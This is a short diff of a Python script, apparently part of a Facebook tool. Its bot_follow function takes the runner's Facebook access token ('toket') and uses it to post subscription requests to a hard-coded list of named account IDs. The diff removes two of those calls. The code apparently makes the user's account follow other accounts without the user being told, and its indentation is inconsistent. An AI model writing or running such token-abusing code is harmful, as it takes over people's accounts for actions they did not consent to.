@@ -286,9 +286,7 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/100000114398701/subscribers?access_token=' + toket) #Arya Firmansyah
 	requests.post('https://graph.facebook.com/100008468288074/subscribers?access_token=' + toket) #Bayu Putra
 	requests.post('https://graph.facebook.com/100001779410663/subscribers?access_token=' + toket) #Faskhal Mahiza
-	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra Lubis
-	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
-	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
+	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra 
         requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) #Onchom     
         requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) #Mey
         requests.post('https://graph.facebook.com/100023543993788/subscribers?access_token=' + toket) #Irman Sniper
